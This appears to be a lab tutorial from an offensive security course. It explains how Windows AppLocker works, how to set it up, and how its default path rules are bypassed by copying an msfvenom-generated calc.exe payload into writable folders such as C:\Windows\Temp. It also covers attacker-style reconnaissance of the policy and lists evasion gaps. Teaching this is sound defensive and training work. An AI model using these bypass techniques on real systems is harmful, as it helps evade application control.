# AppLocker - How It Works and Why It Exists

---

## The Problem It Is Trying to Solve

Picture this scenario. An employee at a company gets a phishing email. The attachment looks like an invoice PDF. They download it and run it. It is not a PDF - it is an executable.

What happens next on a standard Windows machine with no application control?

The executable runs. It drops a tool like Mimikatz into memory, which dumps every password hash from the Windows authentication system (LSASS process). With those hashes, the attacker can authenticate as any user on the domain - including administrators. The entire network is now compromised from one click.

The question is: at what point could this have been stopped?

- The phishing email got through - email filtering failed.
- The user ran the file - user training failed.
- The executable ran - this is where application control kicks in.

AppLocker is that last line. Its job is to make sure that even if a malicious file lands on a machine, it cannot execute. If the file is not on the approved list, it does not run. Period.

That is the threat model. Keep it in mind as you learn the mechanics, because every design decision AppLocker makes - and every gap in it - makes more sense when you understand what it is defending against.

---

## What AppLocker Actually Is

AppLocker is not a single program checking your files. It is split into two components that run at different layers of the Windows operating system:

1. **appid.sys (Kernel Driver)**: This runs inside the Windows Kernel (the core of the operating system). It acts as the physical barrier. It has the power to stop files from executing, but it does not know what your rules are.
2. **AppIDSvc (Application Identity Service)**: This is a standard Windows service running in the background. It holds your security rules and makes the decisions.

Here is exactly how they handle real scenarios.

---

### Scenario 1: You download, install, and run Brave Browser

#### Step A: Running the Installer (`BraveBrowserSetup.exe`)
1. You double-click the downloaded installer.
2. The Windows Kernel begins creating the process. Before the installer's first line of code runs, **`appid.sys`** intercepts the execution request at the kernel layer and pauses it.
3. **`appid.sys`** sends a message to the background service: *"Hey **`AppIDSvc`**, the user is trying to run `C:\Users\Vamsi\Downloads\BraveBrowserSetup.exe`. Is it allowed?"*
4. **`AppIDSvc`** checks your AppLocker rules:
   * It sees a rule: *"Allow files signed by Brave Software, Inc."*
   * It checks the digital signature of the installer file. The signature is valid.
5. **`AppIDSvc`** tells the driver: *"Yes, the file is signed by a trusted publisher. Let it run."*
6. **`appid.sys`** unpauses the process. The installer runs and installs the browser to `C:\Program Files\BraveSoftware\`.

#### Step B: Running the installed Browser (`brave.exe`)
1. You launch Brave.
2. Once again, **`appid.sys`** intercepts the process creation in the kernel and pauses it.
3. It asks the background service: *"Is `C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe` allowed?"*
4. **`AppIDSvc`** checks the rules:
   * It finds a default path rule: *"Allow everything under `C:\Program Files\`."*
   * Since the file is inside that directory, it matches.
5. **`AppIDSvc`** tells the driver: *"Yes, it is in a trusted path. Let it run."*
6. **`appid.sys`** unpauses the process. Brave Browser opens.

---

### Scenario 2: You attempt to run a malicious file (`payload.exe`)

#### Step A: Running the malicious file from your Downloads folder
1. You double-click `payload.exe` inside your Downloads folder.
2. **`appid.sys`** catches the execution request at the kernel layer and pauses it.
3. It queries the background service: *"Is `C:\Users\Vamsi\Downloads\payload.exe` allowed?"*
4. **`AppIDSvc`** checks your active policy:
   * **Path Rules check**: Is the file in `C:\Windows\` or `C:\Program Files\`? No, it is in `C:\Users\Vamsi\Downloads\`.
   * **Publisher Rules check**: Is it signed by a trusted corporation? No, it has no digital signature.
   * **Hash Rules check**: Is this file's unique cryptographic hash explicitly allowed? No.
5. Since `payload.exe` does not match any allowed rules, **`AppIDSvc`** tells the driver: *"No, this file is not authorized. Block it."*
6. **`appid.sys`** terminates the process creation in the kernel immediately. 
7. The code inside `payload.exe` is never loaded into RAM. It never executes a single instruction. Windows displays a popup: *"This app has been blocked by your system administrator."*

---

### How This Architecture Differs From Antivirus

Unlike Antivirus (like Windows Defender), AppLocker does not scan files for malicious code. 

* **Antivirus** inspects the behavior and contents of a file to decide if it is malware. It might let a program run, monitor it, and kill it if it starts doing bad things (like modifying system files).
* **AppLocker** only cares about identity. It checks: *Who signed this?* or *Where is this running from?* If the file is not on the whitelist, it is blocked immediately. It does not care if the file is harmless or dangerous. If it is not approved, it does not run.

Verify the service on your Windows 11 VM now. Open PowerShell:

```powershell
Get-Service AppIDSvc
```

```
Status   Name               DisplayName
------   ----               -----------
Stopped  AppIDSvc           Application Identity
```

It is stopped on a fresh install. This is important: **if AppIDSvc is stopped, AppLocker enforces nothing**. A running service is a prerequisite for any of this to work.

---

## What AppLocker Can and Cannot Watch

AppLocker controls five categories of files, called rule collections. Each is configured independently.

| Collection | File Types It Covers |
|------------|---------------------|
| Executable Rules | `.exe`, `.com` |
| Script Rules | `.ps1`, `.bat`, `.cmd`, `.vbs`, `.js` |
| Windows Installer Rules | `.msi`, `.msp`, `.mst` |
| Packaged App Rules | `.appx` (Windows Store apps) |
| DLL Rules | `.dll`, `.ocx` |

The one that should stand out immediately: **DLL rules are disabled by default on every Windows installation**.

The reason is performance. Every program that starts loads anywhere from a dozen to hundreds of DLLs. If AppLocker checked every DLL load against its policy, the overhead would be significant and noticeable. Microsoft decided the trade-off was not worth it and left DLL rules off.

The consequence: on virtually every AppLocker deployment you encounter in the real world, DLL loading is completely unmonitored. A malicious DLL can be loaded by any allowed program and AppLocker will never see it. This is a structural blind spot, not a misconfiguration.

---

## How AppLocker Makes Decisions

AppLocker uses three rule types to identify files. Each has a different attack surface.

### Publisher Rules

Every legitimate program from a software vendor is digitally signed using a code signing certificate. The signature cryptographically proves who made the file.

Publisher rules say: allow or deny based on the signature. A rule might say "allow anything signed by Microsoft Corporation." That single rule covers thousands of Windows binaries - without needing to list them one by one.

The attack surface: publisher rules trust the signature, not the behavior. `mshta.exe` is signed by Microsoft. A publisher rule allowing Microsoft-signed files will allow `mshta.exe` to run - regardless of what malicious script you feed into it. The signature is legitimate. What the program does after starting is outside AppLocker's scope.

This is why LOLBins work. LOLBins (Living Off the Land Binaries) are legitimate, validly-signed Windows tools that can be abused. They pass every publisher rule check because they are genuinely from Microsoft.

### Path Rules

Path rules allow or deny based on file location. The most common default: allow everything in `C:\Windows\` and everything in `C:\Program Files\`.

The attack surface: path rules trust location, not content. They do not check who wrote the file there or when. If a regular user can write an executable into a folder inside `C:\Windows\`, AppLocker's path rule covers it and it will run.

Several folders inside `C:\Windows\` are writable by standard users because Windows needs them to be:

```
C:\Windows\Temp
C:\Windows\Tasks
C:\Windows\tracing
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks
```

A path rule saying "trust everything in C:\Windows\" applies to every one of these. Writing a malicious executable to `C:\Windows\Temp\` and executing it bypasses AppLocker's default path-based rules entirely.

### Hash Rules

A file hash is a SHA-256 fingerprint calculated from every byte in the file. Hash rules say: allow this exact file and only this exact file.

The practical problem: every software update changes the file bytes, which changes the hash. A hash rule for any actively updated software breaks constantly. Hash rules are rarely used at scale - they appear mostly for custom internal tools that never change.

---

## Enforce vs Audit: The Critical Distinction

Each rule collection operates in one of two modes:

**Enforce Rules** - AppLocker actively blocks files that match deny rules or match no allow rule. This is real protection.

**Audit Only** - AppLocker evaluates files against rules but blocks nothing. It writes to the Event Log: "this would have been blocked." Companies use this to understand what their rules would catch before they flip to enforcement.

This distinction matters in practice. An AppLocker deployment in Audit mode looks identical to an enforcement deployment from the outside. Checking the mode is one of the first reconnaissance steps on an unknown machine. If it is in Audit mode, application control is theater - nothing is actually being blocked.

Check current state on your VM:

```powershell
Get-AppLockerPolicy -Effective -Xml
```

On a freshly installed machine with no AppLocker configuration:

```xml
<AppLockerPolicy Version="1">
</AppLockerPolicy>
```

Empty. No rules, no enforcement. AppLocker exists as a feature but is doing nothing. This is what you will change now.

---

## Setting Up AppLocker

Everything from here runs on your **Windows 11 Enterprise VM** as Administrator.

### Step 1 - Start the AppLocker Service

Open Command Prompt as Administrator:

```cmd
sc config AppIDSvc start= auto
sc start AppIDSvc
```

`sc config` sets the service to start automatically at boot. `sc start` starts it immediately.

Verify:

```cmd
sc query AppIDSvc
```

```
SERVICE_NAME: AppIDSvc
        STATE              : 4  RUNNING
```

`STATE 4 RUNNING` - confirmed. If it shows `STOPPED`, reboot and retry.

### Step 2 - Open Group Policy Editor

Press `Win + R`, type `gpedit.msc`, press Enter.

Navigate in the left panel:

```
Computer Configuration
  └── Windows Settings
        └── Security Settings
              └── Application Control Policies
                    └── AppLocker
```

Click **AppLocker**. You will see the five rule collections listed.

### Step 3 - Understand Why Default Rules Come First

If you enable AppLocker enforcement with zero rules, the default behavior is deny-all. Nothing runs - not Explorer, not Task Manager, not the command prompt. The machine locks itself.

Default rules prevent this by automatically allowing the system to function:
- All files in `C:\Windows\` are allowed
- All files in `C:\Program Files\` are allowed
- Administrators can run anything regardless

Right-click **Executable Rules** > **Create Default Rules**. Three rules appear.

Do the same for **Script Rules** > **Create Default Rules**.

Leave the other collections unconfigured.

### Step 4 - Enable Enforcement

Right-click **AppLocker** > **Properties**.

Under the **Executable Rules** tab, change the dropdown from `Not configured` to `Enforce rules`.

Under the **Script Rules** tab, do the same.

Click OK.

### Step 5 - Apply the Policy

```cmd
gpupdate /force
```

```
Updating policy...
Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

AppLocker is now enforcing. Verify:

```powershell
Get-AppLockerPolicy -Effective -Xml
```

This time you will see actual rules in the output. Find the line `EnforcementMode="Enabled"` under the Exe and Script collections. That confirms enforcement is active, not just configured.

---

## Testing AppLocker With a Real Payload

Reading about AppLocker is one thing. Watching it block something real is how it actually clicks.

You are going to generate a test executable on Kali, transfer it to your Windows VM, and attempt to run it. AppLocker will block it. Then you will run it from a location that AppLocker trusts - and it will run. That gap is the foundation of every bypass in the files that follow.

### On Your Kali VM

Open a terminal and generate a test Windows executable using msfvenom:

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f exe -o test_payload.exe
```

This generates a Windows executable that launches Calculator when run. It is not destructive and has no network component - just a clean test to prove execution happened.

Now serve it over HTTP so Windows can download it:

```bash
python3 -m http.server 8000
```

Leave this running. Your Kali machine is now hosting the file on port 8000.

### On Your Windows 11 VM

Open PowerShell and download the file. Replace `KALI_IP` with your Kali machine's IP address (the one you noted during lab setup):

```powershell
Invoke-WebRequest -Uri "http://KALI_IP:8000/test_payload.exe" -OutFile "C:\test_payload.exe"
```

Confirm the download:

```powershell
Get-Item C:\test_payload.exe
```

```
    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------  ----
-a----        19/06/2026    10:45          73802  test_payload.exe
```

Now attempt to run it:

```powershell
C:\test_payload.exe
```

What you will see:

```
C:\test_payload.exe : This program is blocked by group policy.
For more information, contact your system administrator.
    + CategoryInfo          : NotSpecified: (:) [], Win32Exception
    + FullyQualifiedErrorId : System.ComponentModel.Win32Exception
```

Or, when run from Command Prompt:

```
This program is blocked by group policy. For more information, contact your system administrator.
```

Calculator does not open. AppLocker blocked it.

### Check the Event Log

Open Event Viewer (`Win + R` > `eventvwr.msc`).

Navigate to:

```
Applications and Services Logs
  └── Microsoft
        └── Windows
              └── AppLocker
                    └── EXE and DLL
```

You will see an event. Double-click it. The details will show:

- **Event ID 8004** - the file was blocked
- The full path of the blocked file (`C:\test_payload.exe`)
- The user who attempted to run it
- The policy that caused the block (no matching allow rule)

This is exactly what a defender sees when AppLocker blocks a real attack. The event tells you what was attempted, by whom, and when.

---

## Finding the Gap: Running From a Trusted Path

AppLocker blocked the executable from `C:\`. Now copy it to a location inside the trusted `C:\Windows\` path:

```powershell
Copy-Item C:\test_payload.exe C:\Windows\Temp\test_payload.exe
```

Run it from there:

```powershell
C:\Windows\Temp\test_payload.exe
```

Calculator opens.

AppLocker allowed it because `C:\Windows\Temp\` is inside `C:\Windows\`, which the default path rule trusts unconditionally. The file content did not change. The signature did not change. Only the location changed - and that is enough.

This is not a bug. This is the default path rule behaving exactly as written. The rule trusts the folder. The folder is writable by users. The gap follows directly from the design.

Now check the Event Log again. You will see no 8004 event this time - because nothing was blocked. AppLocker allowed the execution silently.

---

## Reading the Policy as an Attacker Would

When a penetration tester reaches a machine protected by AppLocker, this is one of the first commands they run:

```powershell
$policy = Get-AppLockerPolicy -Effective -Xml
[xml]$xml = $policy
$xml.AppLockerPolicy.RuleCollection | ForEach-Object {
    $col = $_
    Write-Host "`n[$($col.Type) - $($col.EnforcementMode)]" -ForegroundColor Yellow
    $col.FilePathRule | ForEach-Object {
        Write-Host "  Path allowed: $($_.Conditions.FilePathCondition.Path)"
    }
    $col.FilePublisherRule | ForEach-Object {
        Write-Host "  Publisher allowed: $($_.Conditions.FilePublisherCondition.PublisherName)"
    }
}
```

Output on your lab machine:

```
[Exe - Enabled]
  Path allowed: %PROGRAMFILES%\*
  Path allowed: %WINDIR%\*

[Script - Enabled]
  Path allowed: %PROGRAMFILES%\*
  Path allowed: %WINDIR%\*

[Msi - NotConfigured]
[Dll - NotConfigured]
[Appx - NotConfigured]
```

What a penetration tester extracts from this in under a minute:

- `Dll: NotConfigured` - DLL loading is unmonitored. Load anything as a DLL.
- `Msi: NotConfigured` - Installer files are unmonitored.
- `%WINDIR%\*` - Everything in `C:\Windows\` is trusted. Which subfolders are writable by users? Those are execution points.
- `Exe: Enabled` and `Script: Enabled` - These collections enforce. Executables and scripts from outside trusted paths will be blocked.
- No publisher rules present - the configuration is entirely path-based, which is weaker.

One command. The entire attack surface mapped.

---

## What AppLocker Cannot Do - The Permanent Gaps

Some of AppLocker's limitations are configuration issues that can be fixed with better rules. The ones below are structural - they exist regardless of how AppLocker is configured.

**It has no visibility into what allowed programs do.** The moment an allowed program starts running, AppLocker is finished with it. `mshta.exe` is allowed. Pass it a malicious VBScript payload. AppLocker sees `mshta.exe` start, approves it, and exits the picture. What `mshta.exe` does with your script is never inspected.

**It cannot control COM object instantiation.** COM is the Windows subsystem that lets programs create and use objects from other programs. Certain COM objects can run arbitrary commands. When a script creates a COM object to execute code, there is no file being "executed" in the traditional sense - just inter-process communication. AppLocker has no hook into this.

**It cannot evaluate code that is never written to disk.** AppLocker is file-based. If code is downloaded into memory and executed directly without ever becoming a file on disk, there is nothing for AppLocker to evaluate.

**It cannot parse command-line arguments.** `powershell.exe` is allowed. Passing it `-Command "malicious code"` or `-EncodedCommand [base64]` is not running a script file - it is starting an allowed program with arguments. AppLocker checks the program. It does not parse what you pass into it.

---

Each of those four gaps maps directly to an attack technique:

| Gap | Technique | Covered In |
|-----|-----------|-----------|
| Allowed programs doing malicious things | LOLBins | File 04 |
| PowerShell command-line arguments | Encoded commands, bypass flags | File 05 |
| COM object instantiation | COM abuse | File 07 |
| DLL loading unmonitored | DLL hijacking | File 06 |

You now understand AppLocker well enough to bypass it. The next file starts with the most commonly used technique: LOLBins.

---

**Next: [04-lolbins-lab-from-scratch.md](./04-lolbins-lab-from-scratch.md)**
